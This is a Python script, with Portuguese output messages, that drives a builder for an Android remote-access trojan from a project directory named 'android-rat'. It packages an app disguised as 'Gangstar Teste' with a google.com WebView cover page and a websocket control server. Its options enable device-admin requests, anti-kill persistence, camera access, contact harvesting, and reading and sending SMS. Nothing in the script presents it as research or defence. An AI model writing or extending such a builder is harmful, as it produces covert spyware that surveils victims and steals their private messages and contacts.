import sys
import os
from pathlib import Path
from PIL import Image

sys.path.append(os.path.abspath("."))
from apk_builder import APKBuilder

def main():
    print("=" * 60)
    print("GERANDO APK DE TESTE PARA DISPOSITIVO USB")
    print("=" * 60)

    # 1. Cria ícone de teste se não existir
    icon_path = Path("temp_test_icon.png")
    if not icon_path.exists():
        img = Image.new('RGB', (192, 192), color='#0070f3')
        img.save(icon_path)
        print("Ícone temporário gerado:", icon_path)

    # 2. Configura o builder apontando para ws://127.0.0.1:5000/ws (acessível via adb reverse)
    server_url = "ws://127.0.0.1:5000/ws"
    output_apk = Path("gangstar_test.apk").resolve()

    project_dir = Path("../android-rat").resolve()
    print("Diretório do projeto Android:", project_dir)
    print("Servidor configurado no APK:", server_url)
    print("Destino do APK:", output_apk)

    builder = APKBuilder(android_project_path=str(project_dir), ngrok_url=server_url)
    
    success = builder.build_custom_apk(
        app_name="Gangstar Teste",
        icon_path=str(icon_path),
        output_path=str(output_apk),
        webview_url="https://google.com",
        hide_from_launcher=False,
        request_admin=True,
        enable_anti_kill=True,
        language="pt",
        enable_camera=True,
        enable_contacts=True,
        enable_send_sms=True,
        enable_read_sms=True
    )

    if success and output_apk.exists():
        print("✅ APK GERADO COM SUCESSO:", output_apk)
        print(f"Tamanho: {output_apk.stat().st_size / 1024 / 1024:.2f} MB")
    else:
        print("❌ FALHA AO GERAR APK")

if __name__ == "__main__":
    main()
